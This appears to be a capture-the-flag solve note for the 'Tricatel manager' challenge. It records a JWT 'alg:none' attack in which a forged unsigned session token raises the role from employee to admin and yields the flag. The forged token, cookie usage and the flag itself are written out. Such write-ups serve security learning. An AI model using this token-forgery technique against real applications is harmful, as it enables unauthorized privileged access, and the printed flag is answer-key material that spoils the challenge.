# Tricatel manager — JWT alg:none — SOLVED 2026-11-10 ~07:18 UTC
Site: https://manager.cyberzerk.fr
Original token (session cookie): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiZW1wbG95ZSJ9.s9ip1QaEfGwDjSo2VMn4p3fQ1PEGp8GixtSX-jeg6sM
Decoded: header {"alg":"HS256","typ":"JWT"}, payload {"user":"employe8472","role":"employe"}
Site hint: "le controle des jetons a ete bacle... il accepte meme les jetons sans signature"
Forged token (verified live, curl, 2026-11-10 07:18 UTC):
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiYWRtaW4ifQ.
  (also works without trailing dot)
  Header {"alg":"none","typ":"JWT"}, payload {"user":"employe8472","role":"admin"}, empty signature.
  Set as Cookie: session=<token>
Result: page shows "Jeton presente : role admin", "Tableau des primes du CODIR", flag div.
Flag: CyberZerk{JWT_4lg_N0n3_C_3st_N0n}
Note: HS256 header with empty signature did NOT work (role fell back to "invite").
